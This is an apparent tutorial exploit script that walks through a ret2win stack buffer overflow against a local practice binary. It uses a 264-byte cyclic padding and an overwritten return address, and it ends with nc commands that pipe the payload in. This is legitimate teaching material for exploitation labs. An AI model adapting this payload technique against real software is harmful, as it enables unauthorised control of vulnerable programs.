# Basic Buffer Overflow Example
# Demonstrates classic stack-based buffer overflow exploitation
# WHY: This technique works because stack memory grows downward, and we can overwrite
#      the saved return address to redirect execution flow to our target function

print("[*] Basic Buffer Overflow Exploitation")
print("==================================================")

# WHY: We analyze the binary first to understand its protections and locate functions
# This determines which exploit techniques are viable (PIE affects addresses, NX prevents shellcode)
let binary_path = "examples/vuln_binary"

print("\n[*] Step 1: Analyzing target binary...")
let elf = Elf(binary_path)
print("Binary path:", elf.path)
print("Base address:", hex(elf.base_addr))
print("PIE enabled:", elf.pie)          # WHY: PIE randomizes addresses, requiring leaks
print("NX enabled:", elf.nx)            # WHY: NX prevents shellcode execution, requiring ROP
print("Stack canary:", elf.canary)      # WHY: Canary protects against overflow, must be leaked/bypassed

print("\n[*] Step 2: Locating win() function...")
# WHY: We're using ret2win technique - redirecting execution to existing code
# This bypasses NX protection since we're not injecting shellcode
let win_addr = elf.symbols.win
print("win() at:", hex(win_addr))

print("\n[*] Step 3: Finding buffer overflow offset...")
# WHY: We need exact offset to overwrite return address without corrupting stack
# 264 bytes = 256 (buffer) + 8 (saved RBP on x64)
print("Buffer size: 256 bytes")
print("Overflow offset: 264 bytes (256 buffer + 8 RBP)")

print("\n[*] Step 4: Building exploit payload...")
let offset = 264
# WHY: cyclic() generates De Bruijn sequence for crash analysis (each 8-byte sequence is unique)
# This helps determine exact offset if buffer size unknown
let padding = cyclic(offset)
# WHY: p64() packs address in little-endian format (x64 stack layout)
let payload = padding + p64(win_addr)

print("Payload size:", len(payload), "bytes")
print("Padding:", offset, "bytes")
print("Return address:", hex(win_addr))

print("\n[*] Step 5: Writing payload to file...")
write("exploit_payload.bin", payload)
print("Exploit written to: exploit_payload.bin")

print("\n[+] Exploit payload ready!")
print("\n[*] To test the exploit:")
print("    1. Start the server: ./examples/vuln_binary")
print("    2. Send payload: cat exploit_payload.bin | nc localhost 9999")
print("    3. Or pipe directly: cat exploit_payload.bin | ./examples/vuln_binary")
